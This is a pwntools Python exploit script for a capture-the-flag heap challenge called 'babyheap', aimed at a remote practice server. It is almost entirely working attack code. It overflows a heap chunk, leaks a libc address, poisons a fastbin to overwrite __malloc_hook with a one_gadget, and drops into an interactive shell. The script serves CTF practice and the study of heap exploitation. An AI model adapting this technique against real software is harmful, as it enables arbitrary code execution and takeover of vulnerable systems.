from pwn import *

# p = process('./babyheap', env={"LD_PRELOAD":"./libc-2.23.so"})
p = remote('node3.buuoj.cn', 29031)
libc = ELF('libc-2.23.so')
# context.terminal = ['tmux','splitw','-h']
# gdb.attach(proc.pidof(p)[0],gdbscript='''
#                                     c
#                                     ''')
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def fill(index, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)

def free(index):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def dump(index):
    p.recvuntil("Command")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Content: \n")
    content = p.recvline()
    return content

def solve():
    # init some chunks 
    alloc(0x20)     # chunk 0 in fastbin 
    alloc(0x20)     # chunk 1 in fastbin
    alloc(0x20)     # chunk 2 in fastbin
    alloc(0x20)     # chunk 3 in fastbin
    alloc(0x80)     # chunk 4 in unsorted bin
    
    free(1)
    free(2)

    # overflow 
    fill(0, p64(0)*5 + p64(0x31) + p64(0)*5 + p64(0x31) + p8(0xc0))

    fill(3, p64(0)*5 + p64(0x31))

    alloc(0x20)     # chunk 1
    alloc(0x20)     # chunk 2
    alloc(0x10)     # chunk 5 to avoid unsorted bin merge to top chunk when free   
    fill(3, p64(0)*5 + p64(0x91))

    free(4)
    leak = u64(dump(2)[:8])
    libc.address = leak- 0x3c4b78
    malloc_hook  = libc.symbols['__malloc_hook']
    one_gadget_offset = [0x45216, 0x4526a, 0xf0274, 0xf117]
    one_gadget = libc.address + one_gadget_offset[1]
    log.info('leak: %s'%hex(leak))
    log.info('libc: %s'%hex(libc.address))
    log.info('malloc_hook: %s'%hex(malloc_hook))
    log.info('fake chunk addr: %s'%hex(malloc_hook - 0x23))
    log.info('one gadget: %s'%hex(one_gadget))
    alloc(0x80)     # chunk 4
    
    alloc(0x60)     # chunk 6
    alloc(0x60)     # chunk 7
    fill(6, '6'*0x60)
    fill(7, '7'*0x60)

    free(7)
    fill(6, p64(0)*13 + p64(0x71) + p64(malloc_hook-0x23))

    alloc(0x60)
    alloc(0x60)

    fill(8, '\x00'*0x13 + p64(one_gadget))    
    alloc(0x10)
    p.interactive()


if __name__ == '__main__':
    solve()
